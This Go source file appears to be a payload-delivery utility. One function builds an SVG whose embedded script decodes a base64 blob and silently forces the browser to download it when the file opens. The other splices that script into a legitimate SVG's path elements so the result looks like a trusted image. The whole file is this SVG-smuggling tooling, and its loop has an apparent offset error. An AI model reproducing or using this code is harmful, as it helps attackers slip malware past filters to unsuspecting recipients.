package utils

import (
	"fmt"
	"os"
	"strings"
)

func GenerateSVG(b64string, originalFilename string) string {
	svgTemplate := `
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" width="500" height="500">
    <script type="application/ecmascript"><![CDATA[
        document.addEventListener("DOMContentLoaded", function() {
            function base64ToArrayBuffer(base64) {
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                var bytes = new Uint8Array(len);
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }
            var file = '%s';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
            document.documentElement.appendChild(a);
            a.setAttribute('style', 'display: none');
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = '%s';
            a.click();
            window.URL.revokeObjectURL(url);
        });
    ]]></script>
</svg>
`

	return fmt.Sprintf(svgTemplate, b64string, originalFilename)
}

func GenerateTrustedSVG(trustedFile, b64string, originalFilename string) string {
	svg := GenerateSVG(b64string, originalFilename) + "<path "

	data, err := os.ReadFile(trustedFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v", err)
		os.Exit(1)
	}

	text := string(data)
	searchStr := "<path "
	pathCount := strings.Count(text, searchStr)

	if pathCount == 0 {
		fmt.Fprintf(os.Stderr, "Error: The file is not a valid SVG or is corrupted. Please check the file format.\n")
		os.Exit(1)
	}

	count := 0
	startPos := 0
	targetIndex := pathCount / 2

	if targetIndex == 0 {
		targetIndex = 1
	}

	trustedText := ""
	for {
		idx := strings.Index(text[startPos:], searchStr)

		if idx == -1 {
			fmt.Fprintf(os.Stderr, "Error: The file is not a valid SVG or is corrupted. Please check the file format.\n")
			os.Exit(1)
		}

		idx += startPos
		count++

		if count == targetIndex {
			trustedText = text[:idx] + svg + text[idx+len(searchStr):]
			break
		}

		startPos += idx + len(searchStr)
	}

	return trustedText
}
